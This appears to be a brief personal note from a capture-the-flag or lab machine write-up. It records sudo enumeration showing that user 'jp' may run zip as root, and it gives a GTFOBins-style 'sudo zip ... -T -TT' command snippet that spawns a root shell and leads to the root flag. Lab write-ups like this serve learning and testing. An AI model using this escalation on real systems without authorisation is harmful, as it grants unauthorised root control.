- We got access to JeanPaul in [[JeanPaul user escalation]]
- Let's enumerate:

# sudo -l
---
- Manual enumeration gave `jp` can run `/usr/bin/zip` as root
- ![[Pasted image 20250325143522.png]]
- On [gtfobins](https://gtfobins.github.io/gtfobins/zip/), found that we can maintain `root` privs if we can run `zip` as root:
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
- Got `root`:
![[Pasted image 20250325143747.png]]
- `root` flag:
![[Pasted image 20250325143820.png]]